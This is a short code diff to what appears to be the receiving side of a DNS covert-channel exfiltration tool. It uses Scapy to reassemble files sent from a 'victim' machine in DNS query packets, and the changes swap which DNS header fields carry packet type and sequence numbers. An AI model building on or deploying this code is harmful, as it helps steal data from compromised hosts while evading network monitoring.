@@ -29,7 +29,7 @@ class DataReceiver():
         if not pkt.haslayer(DNSQR):
             return
 
-        print(pkt.show())
+        # print(pkt.show())
 
         if pkt.getlayer(DNSQR).qtype == RequestType.PING:
             self._receive_ping(pkt)
@@ -137,20 +137,20 @@ class DataReceiver():
 
     def _handle_data_pkts(self, pkt, dnsqr_layer, filename, key, victim_mac):
         # Determine if it is a head, body, or tail packet
-        if dnsqr_layer.qclass == DataRequestType.HEAD:
+        if dnsqr_layer.opcode == DataRequestType.HEAD:
             # Create entry, append data
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
             self.file_transfer[key] = [PacketData(0, dnsrr_layer.rdata)]
 
-        elif dnsqr_layer.qclass == DataRequestType.NORMAL:
+        elif dnsqr_layer.opcode == DataRequestType.NORMAL:
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
-            self.file_transfer[key].append(PacketData(dns_layer.opcode, dnsrr_layer.rdata))
-        elif dnsqr_layer.qclass == DataRequestType.TAIL:
+            self.file_transfer[key].append(PacketData(dns_layer.qclass, dnsrr_layer.rdata))
+        elif dnsqr_layer.opcode == DataRequestType.TAIL:
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
-            self.file_transfer[key].append(PacketData(dns_layer.opcode, dnsrr_layer.rdata))
+            self.file_transfer[key].append(PacketData(dns_layer.qclass, dnsrr_layer.rdata))
 
             # Sort packets since they may be out of order
 
